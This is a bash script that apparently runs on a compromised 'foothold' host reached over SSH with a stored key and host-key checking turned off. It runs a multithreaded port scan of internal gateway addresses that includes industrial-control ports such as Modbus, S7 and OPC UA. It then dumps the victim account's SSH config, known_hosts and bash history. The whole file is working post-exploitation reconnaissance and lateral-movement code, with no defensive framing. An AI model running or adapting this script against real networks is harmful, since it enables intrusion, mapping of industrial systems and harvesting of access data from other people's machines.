#!/bin/bash
KO="ssh -i $HOME/.ssh/keplerops-foothold -p 2222 -o StrictHostKeyChecking=no -o ConnectTimeout=10 rowan@10.50.13.180"
$KO 'timeout 260 python3 - <<PY
import socket, concurrent.futures
ips=["10.77.53.1","10.77.54.1","10.77.56.1","10.77.55.1","10.77.60.1","10.77.61.1","10.77.62.1"]
def chk(a):
    ip,p=a
    s=socket.socket(); s.settimeout(0.7)
    try:
        s.connect((ip,p)); return f"{ip}:{p}"
    except Exception: return None
    finally: s.close()
jobs=[(ip,p) for ip in ips for p in list(range(1,2000))+[2222,3000,3389,4000,4840,5432,5900,6080,8000,8080,8081,8086,8443,8701,1880,1881,502,102,1024,1502,2404,10000,1080]]
with concurrent.futures.ThreadPoolExecutor(700) as ex:
    for r in ex.map(chk,jobs):
        if r: print(r,flush=True)
print("done")
PY' 2>&1
echo "===== rowan ssh config/hosts"
$KO 'cat ~/.ssh/config 2>/dev/null; echo ---; cut -d" " -f1 ~/.ssh/known_hosts 2>/dev/null | head -20; echo ---; cat ~/.bash_history 2>/dev/null | head -40' 2>&1
